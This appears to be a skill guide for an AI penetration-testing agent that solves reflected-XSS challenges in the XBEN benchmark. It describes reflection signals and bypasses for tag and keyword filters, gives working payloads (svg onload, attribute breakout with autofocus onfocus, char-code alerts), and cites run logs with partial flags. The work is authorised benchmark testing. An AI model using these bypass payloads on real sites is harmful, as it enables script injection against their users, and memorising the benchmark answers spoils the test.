# xss — when to use

Cross-Site Scripting: the app takes a value from your request and **writes it back into the HTML
of a page** without neutralising it, so a string you supply lands inside the markup the browser
parses. Dispatch this skill the moment recon shows your input reflected verbatim into a response
body — a `?name=` parameter echoed into a `<form>`, a search term printed back on the page, a
"your input was: …" box. The recurring lesson from the runs below: **the XSS tell is almost always
a value you sent appearing un-encoded in the next HTML response, and on these benchmarks the
confirmation is unusually loud — a server-side grader literally narrates your progress
("Failed! Try again" → "Let the game begin" → "Oops! You did an alert with X instead of \"XSS\"" →
"Congratulations! Here is the flag: FLAG{…}"). The skill should fire on the *reflection shape*, not
on a confirmed alert. Both failures below (XBEN-018, XBEN-049) had the reflection visible in the
very first recon probe; neither lost on routing — one was derailed by decoy SSTI/SSRF services and
a rate-limit, the other never recorded the reflection as a finding before the planner ran out of
budget.**

## Trigger signals (dispatch this skill the moment you observe…)

- **A request parameter reflected verbatim into the HTML body of the response.** `GET /page?name=ReconUser`
  comes back with `…placeholder="Enter your name..." > ReconUser>` — the literal string you sent is
  sitting in the markup. A value you control appearing un-encoded in the body → xss applies.
- **A reflected value inside a double-quoted HTML attribute.** `GET /page?name=ReconName` →
  `<input type=text name=name … value="ReconName">`. Your input is the *attribute value*; the move is
  to break out with `"` and add an event handler (`" autofocus onfocus=alert('XSS') x="`). The
  attribute-context reflection is just as much an XSS tell as a body-context one.
- **A server-side response that *changes state* when your input contains HTML.** On the Dalgona family,
  benign input keeps an error image / "Failed! Try again!"; an input the grader recognises as a tag
  flips the page to a "start" image / "Let the game begin. Good Luck". A *behavioural* change driven
  purely by whether your value parses as markup is a reflection-into-HTML signal.
- **A tag/keyword blacklist message printed in the response.** `'>Sorry, you can't use that tag` or
  `Sorry you can't use: 'alert'`. The server is *filtering your HTML* — it would not bother filtering
  tags/keywords unless your input reached an HTML sink. A filter message is a positive XSS tell, not a
  dead end (bypass with case-variation, alternate tags, or encoded handlers).
- **A `X-XSS-Protection: 0` response header on the reflecting route.** XBEN-018's `/page` returned
  `X-XSS-Protection: 0` — the app explicitly *disables* the browser's XSS auditor, which on a CTF box
  is a strong hint the route is the intended XSS sink.
- **A bare HTML form whose only input is echoed back.** `<input type=text name=name placeholder="Enter
  your name...">` (or `name=solution placeholder="Enter solution...">`) with no auth, no DB, no other
  function — a thin "type something, see it rendered" page is an XSS challenge by construction.
- **A reflected value the server does NOT evaluate.** `{{7*7}}` coming back as the literal `{{7*7}}`
  (not `49`) rules out SSTI and *confirms* the surface is a plain reflection sink → xss, not ssti.
- **(inferred) Any reflected sink: search boxes (`?q=`), error pages echoing a parameter, comment/message
  fields, `User-Agent`/`Referer` echoed into an admin log viewer, URL path segments printed in a
  "page not found: <path>" message.** Anything where a value you send re-appears in a later HTML response
  fits the same shape.

## Use-case scenarios

- **A reflected-XSS challenge page (the canonical box).** The entire Dalgona XSS family (XBEN-004, 008,
  010–018, 046–051, 059, 062, 064–065, 070, 074, 087) is one thin Flask page: `GET /page?name=<input>`
  reflects `<input>` into the form and a server-side grader decides whether the reflected string would
  fire `alert('XSS')` in a browser. When recon finds a single page whose query parameter is echoed back
  into HTML, xss is the primary lane — there is nothing else to test.

- **Body-context reflection (break straight into markup).** Many variants reflect *after* the closing
  `>` of the input tag: `…placeholder="Enter your name..." > YOUR_INPUT>`. Here you are already in HTML
  body context, so a raw `<script>…</script>`, `<img src=x onerror=…>`, `<svg onload=…>`, or
  `<body onpageshow=…>` is parsed directly. XBEN-004/008/013/074 were body-context wins.

- **Attribute-context reflection (escape the quotes first).** Other variants reflect *inside*
  `value="YOUR_INPUT"`. A raw `<script>` does nothing — it is trapped as an attribute value. The move is
  to close the attribute and the tag, or stay in the tag and add an inline handler:
  `" autofocus onfocus=alert(...) x="`. XBEN-010/049/059/062/087 were attribute-context wins. Knowing
  *which* context you are in (the difference between `> X>` and `value="X">`) decides the payload — read
  the reflection carefully before firing.

- **Filter / blacklist bypass.** Several variants ship a server-side filter and announce it:
  `Sorry, you can't use that tag` (tag blacklist) or `Sorry you can't use: 'alert'` (function-name
  blacklist). The skill's job here is bypass, not detection: case-flipping (`<ScRiPt>`), alternate
  event tags (`<svg onload>`/`<details ontoggle>`/`<body onpageshow>`), HTML-entity-encoded handler
  bodies (`onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"`), or computed function references
  (`top["al"+"ert"]`, `window["al"+"ert"]`). The filter message tells you you are in the right place.

- **Exact-argument graders ("alert with X instead of \"XSS\"").** The win condition is not just "an alert
  fires" — the alert argument must be the exact string `XSS`. `alert(1)` returns
  `Oops! You did an alert with 1 instead of "XSS"`; `alert("XSS")` may be blocked if `XSS` as a string
  literal is filtered, so the passing payloads used `String.fromCharCode(88,83,83)`, `/XSS/.source`, or
  `prompt("XSS")`. When you see the "Oops! … instead of \"XSS\"" message, you have the sink and just need
  the argument exactly right — stay on xss, do not re-route.

## Concrete tells (request → response examples)

- **Body-context reflection, benign probe (XBEN-018).**
  Request: `GET /page?name=ReconUser`
  Response: `…placeholder="Enter your name..." > ReconUser>` — literal echo after the `>`, confirming
  un-encoded body reflection.

- **Attribute-context reflection, benign probe (XBEN-049).**
  Request: `GET /page?name=ReconName`
  Response: `<input type=text name=name placeholder="Enter your name..." value="ReconName">` — your input
  is the `value="…"` attribute; break out with a `"`.

- **Tag blacklist fires (XBEN-018).**
  Request: `GET /page?name=<script>alert(1)</script>`
  Response: `'>Sorry, you can't use that tag` — the server filters HTML tags, proving the input reaches an
  HTML sink (and telling you to switch tags/encodings).

- **`{{7*7}}` is NOT evaluated → it is XSS, not SSTI (XBEN-018/049).**
  Request: `GET /page?name={{7*7}}`
  Response: `… value="{{7*7}}">` / `… > {{7*7}}>` — the literal `{{7*7}}` is reflected, never `49`. Reflection
  without evaluation = xss.

- **Grader state change confirms a recognised payload (XBEN-049).**
  Request: `GET /page?name=<script>alert(1)</script>`
  Response flips from `error_triangle.png` / "Failed! Try again!" to `new_triangle.png` /
  "Let the game begin. Good Luck" — a behavioural change driven by whether the input parses as a tag.

- **Wrong-argument oracle (XBEN-013/049).**
  Request: `GET /page?name=<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">` (alert with `1`)
  Response: `…Oops! You did an alert with 1 instead of "XSS"` — sink confirmed, argument wrong; just need
  `alert('XSS')`.

- **Win, body context (XBEN-013).**
  Request: `GET /page?name=<svg onload=window["al"+"ert"](String.fromCharCode(88,83,83))>`
  Response: `success_circle.png` + `Congratulations! Here is the flag: FLAG{9dc11265…}`.

- **Win, attribute context (XBEN-049).**
  Request: `GET /page?name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="`
  Response: `Congratulations!  Here is the flag: FLAG{28f92ec3…}` (note `alert("XSS")` was rejected with
  "instead of \"XSS\"" because the literal `XSS` string was filtered — the char-code form passed).

- **Win, body context with event-handler tag (XBEN-004, parameter is `solution`).**
  Request: `GET /page?name=solution&solution=<body onpageshow=alert("XSS")>` (input box `name=solution`)
  Response: `success_star.png` + `Congratulations! Here is the flag: FLAG{2c0b9d5d…}`.

## When NOT to use it / easily-confused-with

- **A reflected value that is *evaluated* server-side is SSTI, not XSS.** If `{{7*7}}` comes back as `49`
  (or `${7*7}`/`<%= 7*7 %>` resolves), the template engine executed it → ssti. XSS is specifically "my
  string lands in the HTML and the *browser* would parse it." On the XSS boxes here, `{{7*7}}` reflected
  *literally* — that is the discriminator.
- **A reflected value that triggers a `500`/SQL error is SQLi, not XSS.** A quote causing a database error
  is injection into a query, not into HTML. XSS reflections come back `200` with your string intact in the
  markup.
- **A `url=`/`redirect=` parameter the *server* fetches is SSRF; one the *browser* follows is open-redirect
  — neither is XSS.** XSS needs your value rendered *as HTML in a page*, not used as a fetch target or a
  `Location:` header. (In XBEN-018 the harness also spun up decoy `controlled-ssrf-oracle` and
  `REMOTE_MARKER {{7*7}}` services on side ports; chasing those wasted the run — the real sink was the
  reflected `name` parameter on the main app.)
- **A filter message ("Sorry, you can't use that tag") is a bypass problem, still xss — do not abandon the
  lane.** A blacklist proves the HTML sink exists; the correct response is an encoding/alternate-tag bypass,
  not re-routing to a different vulnerability class.
- **Reflection that is correctly HTML-encoded on output is not exploitable XSS.** If `<` always comes back as
  `&lt;` everywhere with no break-out (e.g. the double-encoded `%253Csvg…` case in XBEN-018 stayed inert),
  the sink is encoded — keep probing other contexts/parameters rather than declaring a win.

## Evidence

- **Body-context reflection (primary trigger).** XBEN-018 (FAILURE; the XSS lane *was* dispatched, agent
  `vulntype-xss`). First recon probe `GET /page?name=ReconUser` returned
  `…placeholder="Enter your name..." > ReconUser>`. Observed:
  `logs/full_run_06-06_01h05m/run-06-06_01h52m07s_XBEN-018/full_logs.jsonl`, `bash_output` at
  `2026-06-06T01:53:22` (cmd `curl -sS 'http://127.0.0.3:9002/page?name=ReconUser'`).
- **Attribute-context reflection (primary trigger).** XBEN-049 (FAILURE). First recon probe
  `GET /page?name=ReconName` returned `<input … value="ReconName">`. Observed:
  `logs/full_run_06-06_01h05m/run-06-06_02h00m28s_XBEN-049/full_logs.jsonl`, `bash_output` at
  `2026-06-06T02:01:49` / `02:01:55` (cmd `curl -sS -D - 'http://127.0.0.14:9001/page?name=ReconName'`).
- **`{{7*7}}` reflected literally (rules out SSTI, confirms XSS).** XBEN-018. Probes of `{{7*7}}`,
  `{{7*'7'}}`, `${7*7}`, `<%= 7*7 %>` all came back un-evaluated as the literal string inside the input.
  Same XBEN-018 log, `bash_output` python payload-loop at `2026-06-06T01:58:15`.
- **Tag blacklist message = HTML sink confirmed.** XBEN-018. `name=<script>alert(1)</script>` →
  `'>Sorry, you can't use that tag`. Same XBEN-018 log, `bash_output` at `2026-06-06T01:58:14`/`01:58:19`.
- **`X-XSS-Protection: 0` header on the reflecting route.** XBEN-018. `/page` response header
  `X-XSS-Protection: 0` (homepage `/` did not carry it). Same XBEN-018 log, first `bash_output` at
  `2026-06-06T01:53:01` (`curl -sS -D - … /page`).
- **Grader state-change tell (Failed → Let the game begin).** XBEN-049 (PASS, earlier complete run,
  agent `vulntype-xss`). `name=test` → `error_triangle.png` / "Failed! Try again!"; `name=<script>…` →
  `new_triangle.png` / "Let the game begin. Good Luck". Observed:
  `logs/1_full_run/run-06-01_01h04m14s_XBEN-049/full_logs.jsonl`, `bash_output` payload-loop at
  `2026-05-31T23:0x` window (`CMD#2`).
- **Wrong-argument oracle ("Oops! You did an alert with X instead of \"XSS\"").** XBEN-013 (PASS, agent
  `vulntype-xss`). `<img src=x onerror="&#x61;…&#x74;(1)">` → "Oops! You did an alert with 1 instead of
  \"XSS\"". Observed: `logs/full_run_06-06_01h05m/run-06-06_…_XBEN-013/full_logs.jsonl`, `bash_output`
  payload-loop (`[14] … sol='… Oops! You did an alert with 1 instead of "XSS"'`).
- **Attribute-context win + literal-`XSS` string filter bypass via char-codes.** XBEN-049 (PASS,
  earlier run). `" autofocus onfocus=alert("XSS") x="` → "Oops! … with undefined instead of \"XSS\"";
  `" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="` → `Congratulations! … FLAG{28f92ec3…}`.
  Observed: `logs/1_full_run/run-06-01_01h04m14s_XBEN-049/full_logs.jsonl`, `bash_output` at the
  `dq_alert_XSS`/`fromchar` payload-loop (`CMD#6`); `flag_auto_verified matched:true` at
  `2026-06-01T01:11:48.111` (agent `vulntype-xss`).
- **Body-context win via computed handler (filter on `alert` keyword).** XBEN-013 (PASS). Blacklist
  `Sorry you can't use: 'alert'`; bypass `<svg onload=window["al"+"ert"](String.fromCharCode(88,83,83))>`
  and `<script>prompt("XSS")</script>` → `success_circle.png` + `FLAG{9dc11265…}`. Same XBEN-013 log,
  `bash_output` CMD#2/CMD#3.
- **Parameter name varies (not always `name`).** XBEN-004 (PASS, agent `vulntype-xss`). Input box is
  `name=solution placeholder="Enter solution...">`; win `<body onpageshow=alert("XSS")>` →
  `success_star.png` + `FLAG{2c0b9d5d…}`. Observed:
  `logs/full_run_06-06_01h05m/run-06-06_…_XBEN-004/full_logs.jsonl`, `bash_output` CMD#5/CMD#6.
- **Consistent grader vocabulary across the family (PASS confirmation).** "Failed! Try again" →
  "Let the game begin" → "Oops! You did an alert … instead of \"XSS\"" → "Congratulations! Here is the
  flag: FLAG{…}" observed in XBEN-004/008/010/013/047/050/059/062/065/070/074/087, every win captured by
  `vulntype-xss` (or a generic `executor-*`). Summarised across
  `logs/full_run_06-06_01h05m/run-06-06_*_XBEN-{004,008,010,013,047,050,059,062,065,070,074,087}/full_logs.jsonl`,
  `flag_auto_verified matched:true` records.
- **FAILURE root causes (not routing misses).** XBEN-018: the XSS reflection + tag blacklist were
  recognised and `vulntype-xss` ran, but the run was distracted by harness decoy services
  (`controlled-ssrf-oracle`, `REMOTE_MARKER {{7*7}}` on side ports → spawned `vulntype-ssti` /
  `custom-main-app-ssti-with-remote-marker` agents) and then hit `CodexAPIError 429
  usage_limit_reached`, looping the planner to `MAX_PLANNER_ITERS=50` with no flag —
  `logs/full_run_06-06_01h05m/run-06-06_01h52m07s_XBEN-018/full_logs.jsonl`, `llm_error` burst from
  `2026-06-06T02:11:09` and final log "Supervisor exceeded MAX_PLANNER_ITERS=50". XBEN-049: recon saw the
  `value="ReconName"` attribute reflection in the first probe but recorded **0 findings**, spent ~9.5 min
  in recon, then hit the same `429 usage_limit_reached` before any executor was dispatched —
  `logs/full_run_06-06_01h05m/run-06-06_02h00m28s_XBEN-049/full_logs.jsonl`, `node_finished recon dt_ms=567799`
  and `llm_error` from `2026-06-06T02:10:28`. Both boxes are solvable (XBEN-049 PASSED in `1_full_run`);
  the lesson is to register the reflection as a finding and dispatch xss promptly, not to look harder for
  the signal.
